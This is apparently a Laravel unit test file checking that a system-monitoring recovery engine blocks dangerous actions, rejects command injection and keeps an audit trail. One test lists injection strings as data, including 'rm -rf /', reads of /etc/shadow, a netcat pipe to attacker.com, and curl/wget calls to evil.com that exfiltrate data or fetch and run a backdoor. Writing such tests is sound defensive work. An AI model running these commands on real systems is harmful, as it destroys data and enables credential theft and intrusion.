<?php

namespace Tests\Unit;

use App\Models\SystemGuard\IncidentLog;
use App\Models\SystemGuard\MonitorConfig;
use App\Services\SystemGuard\MonitoringService;
use App\Services\SystemGuard\RecoveryEngine;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

class SystemGuardSecurityTest extends TestCase
{
    use RefreshDatabase;

    private function createConfig(array $overrides = []): MonitorConfig
    {
        return MonitorConfig::create(array_merge([
            'name'       => 'Test Target',
            'target_url' => 'https://example.com',
            'type'       => 'http',
            'is_active'  => true,
            'max_retries' => 3,
            'retry_delay_seconds' => 1,
            'recovery_actions' => ['retry_connection'],
            'auto_recovery_enabled' => true,
        ], $overrides));
    }

    private function createIncident(MonitorConfig $config): IncidentLog
    {
        return IncidentLog::create([
            'incident_id'       => 'INC-2026-SEC001',
            'monitor_config_id' => $config->id,
            'target'            => $config->target_url,
            'error_category'    => 'DNS',
            'error_type'        => 'DNS_NXDOMAIN',
            'error_message'     => 'Domain not found',
            'severity'          => 'HIGH',
            'status'            => 'OPEN',
            'detected_at'       => now(),
            'retry_count'       => 0,
        ]);
    }

    private function createEngine(): RecoveryEngine
    {
        $monitoringService = new class extends MonitoringService {};

        return new RecoveryEngine($monitoringService);
    }

    // ==========================================================
    // BLOCKED ACTIONS
    // ==========================================================

    public function test_shell_exec_is_blocked(): void
    {
        $engine = $this->createEngine();

        $this->assertFalse($engine->isActionAllowed('shell_exec'));
    }

    public function test_exec_is_blocked(): void
    {
        $engine = $this->createEngine();

        $this->assertFalse($engine->isActionAllowed('exec'));
    }

    public function test_system_is_blocked(): void
    {
        $engine = $this->createEngine();

        $this->assertFalse($engine->isActionAllowed('system'));
    }

    public function test_passthru_is_blocked(): void
    {
        $engine = $this->createEngine();

        $this->assertFalse($engine->isActionAllowed('passthru'));
    }

    public function test_popen_is_blocked(): void
    {
        $engine = $this->createEngine();

        $this->assertFalse($engine->isActionAllowed('popen'));
    }

    public function test_proc_open_is_blocked(): void
    {
        $engine = $this->createEngine();

        $this->assertFalse($engine->isActionAllowed('proc_open'));
    }

    public function test_eval_is_blocked(): void
    {
        $engine = $this->createEngine();

        $this->assertFalse($engine->isActionAllowed('eval'));
    }

    public function test_assert_is_blocked(): void
    {
        $engine = $this->createEngine();

        $this->assertFalse($engine->isActionAllowed('assert'));
    }

    public function test_sudo_is_blocked(): void
    {
        $engine = $this->createEngine();

        $this->assertFalse($engine->isActionAllowed('sudo'));
    }

    public function test_kill_is_blocked(): void
    {
        $engine = $this->createEngine();

        $this->assertFalse($engine->isActionAllowed('kill'));
    }

    public function test_reboot_is_blocked(): void
    {
        $engine = $this->createEngine();

        $this->assertFalse($engine->isActionAllowed('reboot'));
    }

    public function test_shutdown_is_blocked(): void
    {
        $engine = $this->createEngine();

        $this->assertFalse($engine->isActionAllowed('shutdown'));
    }

    public function test_service_restart_all_is_blocked(): void
    {
        $engine = $this->createEngine();

        $this->assertFalse($engine->isActionAllowed('service_restart_all'));
    }

    public function test_unlink_arbitrary_is_blocked(): void
    {
        $engine = $this->createEngine();

        $this->assertFalse($engine->isActionAllowed('unlink_arbitrary'));
    }

    public function test_chmod_arbitrary_is_blocked(): void
    {
        $engine = $this->createEngine();

        $this->assertFalse($engine->isActionAllowed('chmod_arbitrary'));
    }

    public function test_chown_arbitrary_is_blocked(): void
    {
        $engine = $this->createEngine();

        $this->assertFalse($engine->isActionAllowed('chown_arbitrary'));
    }

    public function test_curl_exec_arbitrary_is_blocked(): void
    {
        $engine = $this->createEngine();

        $this->assertFalse($engine->isActionAllowed('curl_exec_arbitrary'));
    }

    public function test_file_put_contents_arbitrary_is_blocked(): void
    {
        $engine = $this->createEngine();

        $this->assertFalse($engine->isActionAllowed('file_put_contents_arbitrary'));
    }

    // ==========================================================
    // COMMAND INJECTION ATTEMPTS
    // ==========================================================

    public function test_command_injection_via_action_name_is_blocked(): void
    {
        $engine = $this->createEngine();

        $injectionAttempts = [
            'retry_connection; rm -rf /',
            'retry_connection && cat /etc/passwd',
            'retry_connection | nc attacker.com 4444',
            'retry_connection `whoami`',
            'retry_connection $(cat /etc/shadow)',
            'rm -rf /',
            'curl http://evil.com/steal?data=$(cat /etc/passwd)',
            'wget http://evil.com/backdoor.sh && chmod +x backdoor.sh && ./backdoor.sh',
        ];

        foreach ($injectionAttempts as $attempt) {
            $this->assertFalse(
                $engine->isActionAllowed($attempt),
                "Injection attempt should be blocked: {$attempt}"
            );
        }
    }

    public function test_recovery_does_not_execute_blocked_actions(): void
    {
        $config = $this->createConfig([
            'recovery_actions' => ['shell_exec', 'exec', 'system', 'retry_connection'],
        ]);

        $incident = $this->createIncident($config);

        $engine = $this->createEngine();

        $result = $engine->recover($incident, $config);

        $this->assertDatabaseMissing('recovery_logs', [
            'action' => 'shell_exec',
        ]);

        $this->assertDatabaseMissing('recovery_logs', [
            'action' => 'exec',
        ]);

        $this->assertDatabaseMissing('recovery_logs', [
            'action' => 'system',
        ]);
    }

    // ==========================================================
    // UNAUTHORIZED RECOVERY (no auto_recovery_enabled)
    // ==========================================================

    public function test_no_auto_recovery_when_disabled(): void
    {
        $config = $this->createConfig([
            'auto_recovery_enabled' => false,
        ]);

        $incident = $this->createIncident($config);

        $engine = $this->createEngine();

        $result = $engine->recover($incident, $config);

        $this->assertFalse($result['success']);
    }

    // ==========================================================
    // WHITELIST INTEGRITY
    // ==========================================================

    public function test_whitelisted_actions_are_safe(): void
    {
        $engine = $this->createEngine();

        $allowed = $engine->getAllowedActions();

        $safeTypes = ['dns', 'connection', 'wait', 'notification', 'escalation', 'tunnel'];

        foreach ($allowed as $key => $def) {
            $this->assertContains($def['type'], $safeTypes,
                "Action {$key} has unexpected type: {$def['type']}"
            );
        }
    }

    public function test_all_blocked_actions_are_actually_dangerous(): void
    {
        $engine = $this->createEngine();

        $blocked = $engine->getBlockedActions();

        $this->assertContains('shell_exec', $blocked);
        $this->assertContains('exec', $blocked);
        $this->assertContains('system', $blocked);
        $this->assertContains('eval', $blocked);
        $this->assertContains('sudo', $blocked);

        $this->assertGreaterThan(5, count($blocked));
    }

    // ==========================================================
    // AUDIT TRAIL
    // ==========================================================

    public function test_recovery_creates_audit_trail(): void
    {
        $config = $this->createConfig([
            'recovery_actions' => ['notify_admin', 'escalate'],
        ]);

        $incident = $this->createIncident($config);

        $engine = $this->createEngine();

        $result = $engine->recover($incident, $config);

        $this->assertDatabaseHas('recovery_logs', [
            'incident_id'       => $incident->incident_id,
            'monitor_config_id' => $config->id,
            'action'            => 'notify_admin',
            'status'            => 'SUCCESS',
        ]);

        $recoveryLog = \App\Models\SystemGuard\RecoveryLog::where('incident_id', $incident->incident_id)
            ->where('action', 'notify_admin')
            ->first();

        $this->assertNotNull($recoveryLog->started_at);
        $this->assertNotNull($recoveryLog->completed_at);
        $this->assertNotNull($recoveryLog->attempt_number);
        $this->assertNotNull($recoveryLog->action_type);
    }

    public function test_incident_has_full_audit_trail(): void
    {
        $config = $this->createConfig([
            'recovery_actions' => ['retry_connection'],
        ]);

        $incident = $this->createIncident($config);

        $engine = $this->createEngine();

        $result = $engine->recover($incident, $config);

        $incident->incrementRetry();

        $fresh = $incident->fresh();

        $this->assertNotNull($fresh->incident_id);
        $this->assertNotNull($fresh->detected_at);
        $this->assertEquals(1, $fresh->retry_count);
        $this->assertEquals('RECOVERING', $fresh->status);
    }
}
